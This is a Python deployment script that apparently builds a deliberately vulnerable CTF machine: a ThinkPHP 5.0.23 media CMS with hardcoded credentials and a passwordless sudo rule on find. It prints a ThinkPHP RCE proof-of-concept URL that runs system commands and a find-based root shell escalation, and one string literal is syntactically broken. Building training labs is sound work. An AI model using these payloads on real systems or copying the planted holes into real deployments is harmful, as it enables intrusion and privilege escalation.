#!/usr/bin/env python3
"""Deploy A2: 融媒体内容管理平台 (TP5.0.23 + 广电业务数据 + sudo find 提权)"""
import paramiko
import base64
import tempfile
import os
import io
import tarfile

HOST = '192.168.100.20'
USER = 'gdadmin'
PASS = 'Gdadmin@123'
MYSQL_PASS = 'R00t@Mysql#2024'
SRC_DIR = r'E:\vibecoding\gdj_ctf\q1\a2-a2-media-cms'

c = paramiko.SSHClient()
c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c.connect(HOST, username=USER, password=PASS,
          timeout=15, look_for_keys=False, allow_agent=False)

def sudo(cmd, timeout=120):
    full = f'echo "{PASS}" | sudo -S bash -c \'{cmd}\''
    stdin, stdout, stderr = c.exec_command(full, timeout=timeout)
    stdout.channel.settimeout(timeout)
    stderr.channel.settimeout(timeout)
    out = stdout.read().decode('utf-8', errors='replace').strip()
    err = stderr.read().decode('utf-8', errors='replace').strip()
    code = stdout.channel.recv_exit_status()
    return out, err, code

def write_remote(path, content):
    b64 = base64.b64encode(content.encode()).decode()
    cmd = f'{{ echo "{PASS}"; echo {b64} | base64 -d; }} | sudo -S tee "{path}" > /dev/null 2>&1'
    stdin, stdout, stderr = c.exec_command(cmd, timeout=30)
    stdout.channel.recv_exit_status()

def step(n, title):
    print(f"\n{'='*50}")
    print(f" Step {n}: {title}")
    print(f"{'='*50}")

# ==================== Step 1: Install Packages ====================
step(1, "Install packages (nginx, mysql, php8.1)")
out, _, code = sudo('apt update 2>&1 | tail -3', timeout=180)
print(f"apt update: {out[:200]}")

out, err, code = sudo(
    'DEBIAN_FRONTEND=noninteractive apt install -y '
    'nginx mysql-server '
    'php8.1 php8.1-fpm php8.1-mysql php8.1-mbstring '
    'php8.1-xml php8.1-curl php8.1-gd php8.1-zip '
    'curl wget netcat-openbsd vim unzip 2>&1 | tail -5',
    timeout=900)
print(f"Packages: exit={code}")

for pkg in ['nginx', 'mysql-server', 'php8.1', 'php8.1-fpm', 'php8.1-mysql']:
    out, _, _ = sudo(f'dpkg -l {pkg} 2>/dev/null | tail -1')
    ok = 'ii' in out[:10] if out else False
    print(f"  {pkg}: {'OK' if ok else 'MISSING'}")

# ==================== Step 2: Upload CMS Files ====================
step(2, "Upload & deploy CMS files (TP5.0.23)")
buf = io.BytesIO()
with tarfile.open(fileobj=buf, mode='w:gz') as tar:
    for root, dirs, files in os.walk(SRC_DIR):
        # Skip runtime/cache directories and git files
        dirs[:] = [d for d in dirs if d not in ('runtime', '.git')]
        for f in files:
            if f in ('init_db.sql',):  # init_db.sql handled separately
                continue
            full = os.path.join(root, f)
            tar.add(full, os.path.relpath(full, SRC_DIR))
tar_data = buf.getvalue()
print(f"CMS archive: {len(tar_data)/1024:.1f} KB")

sftp = c.open_sftp()
sftp.putfo(io.BytesIO(tar_data), '/tmp/a2-cms.tar.gz')
sftp.close()

out, _, code = sudo(
    'rm -rf /var/www/a2-media-cms && '
    'mkdir -p /var/www/a2-media-cms && '
    'cd /var/www/a2-media-cms && tar xzf /tmp/a2-cms.tar.gz && echo OK')
print(f"Extract: {out}")

out, _, code = sudo(
    'chown -R www-data:www-data /var/www/a2-media-cms && '
    'chmod -R 755 /var/www/a2-media-cms && '
    'mkdir -p /var/www/a2-media-cms/runtime && '
    'chmod -R 777 /var/www/a2-media-cms/runtime && echo OK')
print(f"Permissions: {out}")

# ==================== Step 3: MySQL Setup ====================
step(3, "Configure MySQL")

init_sql_path = os.path.join(SRC_DIR, 'init_db.sql')
if os.path.exists(init_sql_path):
    sftp = c.open_sftp()
    sftp.put(init_sql_path, '/tmp/init_db.sql')
    sftp.close()
    print("init_db.sql uploaded")
else:
    print("ERROR: init_db.sql not found!")
    c.close()
    exit(1)

out, _, code = sudo('systemctl enable mysql && systemctl start mysql && echo OK')
print(f"MySQL start: {out}")

# Set root password
sql1 = "ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'R00t@Mysql#2024';\nFLUSH PRIVILEGES;\n"
write_remote('/tmp/setpass.sql', sql1)
out, err, code = sudo('mysql -u root < /tmp/setpass.sql 2>&1')
print(f"Set password: code={code}")

# Import database
out, err, code = sudo(f'mysql -u root -p"{MYSQL_PASS}" < /tmp/init_db.sql 2>&1')
print(f"DB Import: code={code}, err={err[:100] if err else 'none'}")

# Verify
out, err, code = sudo(f'mysql -u root -p"{MYSQL_PASS}" -e '
    '"SELECT TABLE_NAME, TABLE_ROWS FROM information_schema.tables '
    'WHERE TABLE_SCHEMA=\'media_cms\';" 2>&1')
print(f"Tables:\n{out}")

# Create sync account
sync_sql = ("CREATE USER IF NOT EXISTS 'yfcmf_sync'@'192.168.100.10' IDENTIFIED BY 'YfCmf@Sync#2024';\n"
            "GRANT SELECT, INSERT, UPDATE, DELETE ON media_cms.* TO 'yfcmf_sync'@'192.168.100.10';\n"
            "FLUSH PRIVILEGES;\n")
write_remote('/tmp/sync.sql', sync_sql)
out, _, code = sudo(f'mysql -u root -p"{MYSQL_PASS}" < /tmp/sync.sql 2>&1')
print(f"Sync account: code={code}")

# ==================== Step 4: Nginx + PHP-FPM ====================
step(4, "Configure Nginx + PHP-FPM")

# Start PHP-FPM
out, _, code = sudo('systemctl enable php8.1-fpm && systemctl start php8.1-fpm && echo OK')
print(f"PHP-FPM: {out}")

# Write Nginx config
nginx_conf = """server {
    listen 80 default_server;
    server_name _;

    root /var/www/a2-media-cms/public;
    index index.php index.html;

    location / {
        try_files $uri $uri/ /index.php?$query_string;
    }

    location ~ \\.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php8.1-fpm.sock;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }

    location ~ /\\.ht {
        deny all;
    }
}
"""
tmpfile = os.path.join(tempfile.gettempdir(), 'nginx-a2.conf')
with open(tmpfile, 'w') as f:
    f.write(nginx_conf)
sftp = c.open_sftp()
sftp.put(tmpfile, '/tmp/nginx-a2.conf')
sftp.close()
os.unlink(tmpfile)

out, _, code = sudo(
    'cp /tmp/nginx-a2.conf /etc/nginx/sites-available/default && '
    'nginx -t 2>&1 && systemctl restart nginx && '
    'systemctl enable nginx && echo OK')
print(f"Nginx: {out}")

# Configure PHP-FPM env var for MySQL password (方案 A)
# Write env config via dedicated conf file (cleaner than appending to www.conf)
fpm_env_conf = """; === 融媒体内容管理平台 - 数据库密码配置 ===
; 密码通过环境变量注入，代码中使用 getenv('MYSQL_PASS') 读取
; 运维修改密码后需重启 php8.1-fpm: systemctl restart php8.1-fpm
env[MYSQL_PASS] = R00t@Mysql#2024
"""
tmp_env = os.path.join(tempfile.gettempdir(), 'fpm-zz-media-env.conf')
with open(tmp_env, 'w') as f:
    f.write(fpm_env_conf.strip())
sftp = c.open_sftp()
sftp.put(tmp_env, '/tmp/zz-media-env.conf')
sftp.close()
os.unlink(tmp_env)

out, _, code = sudo(
    'cp /tmp/zz-media-env.conf /etc/php/8.1/fpm/pool.d/zz-media-env.conf && '
    'systemctl restart php8.1-fpm && echo OK')
print(f"FPM env: {out}")

# Verify env var accessible via PHP
write_remote('/var/www/a2-media-cms/public/envcheck.php',
    '<?php echo "MYSQL_PASS=" . (getenv("MYSQL_PASS") ? "SET" : "NOT SET") . "\\n";')
out, _, code = sudo('curl -s http://127.0.0.1/envcheck.php 2>&1')
print(f"Env check: {out.strip()}")
sudo('rm -f /var/www/a2-media-cms/public/envcheck.php')

# ==================== Step 5: Operator user + sudo find ====================
step(5, "Setup operator user + sudo find")

out, _, code = sudo(
    'id operator 2>/dev/null || '
    'useradd -m operator -s /bin/bash && '
    'echo "operator:0p3rat0r@Media" | chpasswd && echo "user created" || echo "user exists"')
print(f"Operator user: {out.strip()}")

write_remote('/etc/sudoers.d/operator',
    'operator ALL=(ALL) NOPASSWD: /usr/bin/find\n')
out, _, code = sudo('chmod 440 /etc/sudoers.d/operator && echo OK')
print(f"Sudoers: {out}")

out, _, code = sudo('sudo -u operator sudo -ln 2>&1')
print(f"operator sudo: {out[:200]}")

# ==================== Step 6: Verification ====================
step(6, "Final Verification")

checks = [
    ("Nginx", "systemctl is-active nginx 2>&1"),
    ("PHP-FPM", "systemctl is-active php8.1-fpm 2>&1"),
    ("MySQL", "systemctl is-active mysql 2>&1"),
    ("Port 80", "ss -tlnp 2>/dev/null | grep ':80 ' | head -1"),
    ("Homepage", "curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1/"),
    ("Dashboard", "curl -s http://127.0.0.1/ 2>&1 | grep -o '<title>[^<]*</title>'"),
    ("Articles", "curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1/articles"),
    ("Programs", "curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1/programs"),
    ("Logs", "curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1/logs"),
    ("SysInfo", "curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1/sysinfo"),
    ("TP5 RCE POC", "curl -s 'http://127.0.0.1/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1' 2>&1 | grep -c 'www-data'"),
    ("Sudo find", "sudo -u operator sudo -ln 2>&1 | grep -c find"),
    ("FPM env MYSQL_PASS", "grep -c 'MYSQL_PASS' /etc/php/8.1/fpm/pool.d/zz-media-env.conf"),
    ("DB config getenv", "grep -c 'getenv' /var/www/a2-media-cms/application/database.php"),
    ("Media CMS DB", "mysql -u root -p'" + MYSQL_PASS + "' -e 'SELECT COUNT(*) FROM media_cms.articles;' 2>&1 | tail -1"),
]

for label, cmd in checks:
    out, err, code = sudo(cmd)
    print(f"  {label}: {out[:80]}")


# ==================== Post-deploy: PHP 8.x compatibility fixes ====================
print("
Applying PHP 8.x compatibility fixes...")
# Fix 1: Query.php curly brace → bracket
sudo("sed -i 's/ord(\$value{0})/ord(\$value[0])/g' /var/www/a2-media-cms/thinkphp/library/think/db/Query.php")
# Fix 2: FPM env config permissions

# Cleanup
sudo('rm -f /tmp/a2-cms.tar.gz /tmp/init_db.sql /tmp/setpass.sql /tmp/sync.sql /tmp/nginx-a2.conf /tmp/zz-media-env.conf')

c.close()
print(f"\n{'='*50}")
print(" A2 DEPLOYMENT COMPLETE")
print(f"{'='*50}")
print("  URL:       http://192.168.100.20/")
print("  Dashboard: http://192.168.100.20/")
print("  Articles:  http://192.168.100.20/articles")
print("  Programs:  http://192.168.100.20/programs")
print("  Logs:      http://192.168.100.20/logs")
print("  SysInfo:   http://192.168.100.20/sysinfo")
print("  RCE POC:   http://192.168.100.20/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami")
print()
print("  MySQL:    root / R00t@Mysql#2024")
print("  SSH:      operator / 0p3rat0r@Media")
print("  Privesc:  sudo find . -exec /bin/sh -p \\; -quit")
print("  Env var:  MYSQL_PASS in /etc/php/8.1/fpm/pool.d/zz-media-env.conf")
